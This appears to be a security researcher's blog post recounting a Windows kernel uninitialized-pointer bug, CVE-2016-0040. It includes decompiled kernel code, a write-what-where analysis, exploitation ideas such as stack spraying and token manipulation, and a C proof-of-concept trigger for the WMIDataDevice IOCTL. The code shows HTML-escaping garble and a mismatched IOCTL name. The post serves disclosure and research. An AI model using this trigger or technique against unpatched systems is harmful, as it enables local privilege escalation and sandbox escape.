---
layout: post
title: "CVE-2016-0040 Story of Uninitialized Pointer in Windows Kernel"
date: 2024-03-27 22:27:59 +0100
categories: fuzzing
---

This post is a resharing of a blog I wrote about a vulnerability I discovered in Windows kernel almost a decade ago.


this vulnerablity is interesting for two reseaons first it gave Write arbitrary data to arbitrary address, second it has an amusing story associated with it. after my discovery of this vulnerability, I shared a tweet about it, which caught the attention of researchers from Microsoft. Remarkably, they were able to discern the root cause of the vulnerability simply by examining my tweet.
you can read their story in [MSRC blog](https://msrc.microsoft.com/blog/2017/06/tales-from-the-msrc-from-pixels-to-poc/)

![My image Name](/assets/tweet.png)


A few months ago, I discovered some vulnerabilities in the Windows kernel, mostly related to local privilege escalation. Microsoft patched one of the reported vulnerabilities in MS16-014. The vulnerability type is an uninitialized pointer dereference. This vulnerability can be triggered even by a process with "low integrity level", meaning that successfully exploiting this vulnerability can lead to bypassing the sandbox (for example, the IE sandbox) or generic local privilege escalation for any process.


Here's a description of the bug:

For handling some WMI functions, Windows NT creates a named device called "WMIDataDevice". This device is accessible from user mode with any permission (you can check it with WinObj). WMIDataDevice handles some IOCTLs, with the WmipReceiveNotifications function responsible for the IOCTL_WMI_ENUMERATE_GUIDS IOCTL. Based on the first DWORD of Irp->AssociatedIrp.SystemBuffer, WmipReceiveNotifications decides whether to use the stack or kernel pool as a buffer for storing data/pointers. If the first DWORD is less than or equal to 0x10, the stack is selected as the buffer.

There's another important usage of the mentioned DWORD. WmipReceiveNotifications uses this DWORD as a counter for looping and initializing the local buffer. So, if we put 0 in the first DWORD of Irp->AssociatedIrp.SystemBuffer from user mode, the function selects the stack as the buffer. As mentioned earlier, this buffer is initiated in a loop. In this case, since we passed 0, the function skips loop execution, leaving the stack buffer uninitialized.

To reach the vulnerability, we need to bypass some other condition inside WmipReceiveNotifications.


v16 comes from user mode and its value needs to be 2.
{% highlight cpp %}
v16 = *(_DWORD *)(SystemBuffer + 4);
{% endhighlight %}

Insert a valid handle for ObReferenceObjectByHandle in SystemBuffer.
{% highlight cpp %}
v39 = ObReferenceObjectByHandle(*(HANDLE *)(SystemBuffer + 16), 0x43Au, 0, 1, &PIRP, 0);
{% endhighlight %}


finally uninitialized local variable used as target pointer and function write a DWORD from SystemBuffer + 8 to it

we can control what is written but for manipulating uninitialized stack we need a good stack spray inside kernel

{% highlight cpp %}
v23 = *(_DWORD *)LocalBuffer;

*(_DWORD *)(v23 + 60) = *(_DWORD *)(SystemBuffer + 8); // Write arbitrary data to uninitialized local variable or Write-what-where condition
{% endhighlight %}

Utilizing an uninitialized local variable as a pointer to write arbitrary data to its referenced location requires the attacker to employ a stack spraying technique for successful exploitation. This vulnerability presents a "write-what-where" condition, offering multiple ways for exploitation, such as zero ACL or SET token permission.

{% highlight cpp %}
int __userpurge WmipReceiveNotifications @(int SystemBuffer @, unsigned int * OutputBufferSize, PVOID PIRP) {
     ...
     ...
 
     v4 = SystemBuffer;
     v5 = * OutputBufferSize;
     v6 = * (_DWORD * ) v4;
     v39 = -1073741811;
     v37 = v5;
     v36 = v6;
     if (v6 <= 0x10) // if first value inside buffer from user mode is less than or equal to 0x10 then use local stack so we pass 0 to force use local stack
     {
         LocalBuffer =& v32;;
         
     } else {
         LocalBuffer = ExAllocatePoolWithTag(PagedPool, 8 * v6, 0x70696D57 u);
         if (!LocalBuffer)
             return -1073741670;
     }
 
     we don 't go inside this if because we use passed zero
 
     v42 = 0;
     v40 = 0;
     v38 = 0;
     v44 = 0;
     v41 = 0;
     if (v6) 
{
         do {
             v39 = ObReferenceObjectByHandle( * (HANDLE * )(v4 + 8 * v41 + 24), 4 u, WmipGuidObjectType, 1,&Object, 0);
             if (v39<0) goto LABEL_55;
             v8 = Object;
             v9 = 0;
             if (v44) {
                 while (Object != * ((PVOID * ) LocalBuffer + 2 * v9)) {.......
                 }
             }
         }
     } // because v42 and v45 is set to 0 we also bypass this two if 
if ( v42 == 1 ) { ... ... ... } 
if ( v45 | BYTE3(PIRP) ) { v13 = v37; if ( v11 &v37 )
     
  * (_DWORD * )(v4 + 48) = v11; * (_DWORD * ) v4 = 56; * (_DWORD * )(v4 + 44) = 32; * OutputBufferSize = 56;
     
     ...
     ...
     ...
 
 //v16 come from user mode so we can set it's value 2 then lead code to here
 
 if (v16 != 2) 
{
     LABEL_54:
         * OutputBufferSize = 0;
     goto LABEL_55;
 }
 v39 = ObReferenceObjectByHandle( * (HANDLE * )(v4 + 16), 0x43A u, 0, 1,&PIRP, 0);
 if (v39 >= 0)
 {
     v39 = ObOpenObjectByPointerWithTag((ULONG_PTR) PIRP, 512, 0, 0x1FFFFF, 0, 0, 1953261124, (int)&v35);
     if (v39>= 0)
 {
         v23 = * (_DWORD * ) LocalBuffer; * (_DWORD * )(v23 + 60) = * (_DWORD * )(v4 + 8); // write arbitrary data from uninitialized local variable

{% endhighlight %}

# Advantages of the vulnerability:
* The bug can be triggered even in low integrity contexts.
*  It's unrelated to win32k.sys, meaning it ignores the "Win32k system call disable policy", for instance in Chrome browser.
* It works with the default OS configuration, providing a universal sandbox bypass.


sample poc for the vulnerability
{% highlight cpp %}

typedef union {
    HANDLE Handle;
    ULONG64 Handle64;
    ULONG32 Handle32;
}
HANDLE3264, * PHANDLE3264;
 
typedef struct {
    //
    // List of guid notification handles
    //
    ULONG HandleCount;
    ULONG Action;
    HANDLE /* PUSER_THREAD_START_ROUTINE */ UserModeCallback;
    HANDLE3264 UserModeProcess;
    HANDLE3264 Handles[20];
}
WMIRECEIVENOTIFICATION, * PWMIRECEIVENOTIFICATION;
 
#
define RECEIVE_ACTION_CREATE_THREAD 2 // Mark guid objects as requiring
 
typedef struct {
    IN VOID * ObjectAttributes;
    IN ACCESS_MASK DesiredAccess;
 
    OUT HANDLE3264 Handle;
}
WMIOPENGUIDBLOCK, * PWMIOPENGUIDBLOCK;
 
#
define IOCTL_WMI_ENUMERATE_GUIDS\
CTL_CODE(FILE_DEVICE_UNKNOWN, WmiEnumerateGuidList, METHOD_BUFFERED, FILE_READ_ACCESS)
 
void main() {
    DWORD dwBytesReturned;
    HANDLE threadhandle;
    WMIRECEIVENOTIFICATION buffer;
    CHAR OutPut[1000];
 
    memset( & amp; buffer, '\x41', sizeof(buffer)); // set ecx to 0x41414141
    buffer.HandleCount = 0;
    buffer.Action = RECEIVE_ACTION_CREATE_THREAD;
    buffer.UserModeProcess.Handle = GetCurrentProcess(); 
 
    // using NtMapUserPhysicalPages for spraying stack cant help us
 
    HANDLE hDriver = CreateFileA("\\\\.\\WMIDataDevice", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDriver != INVALID_HANDLE_VALUE) {
        while (TRUE) {
            if (!DeviceIoControl(hDriver, IOCTL_WMI_RECEIVE_NOTIFICATIONS, & amp; buffer, sizeof(buffer), & amp; OutPut, sizeof(OutPut), & amp; dwBytesReturned, NULL)) {
                return;
            }
        }
 
    }
 
}
{% endhighlight %}


[jekyll-docs]: https://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/




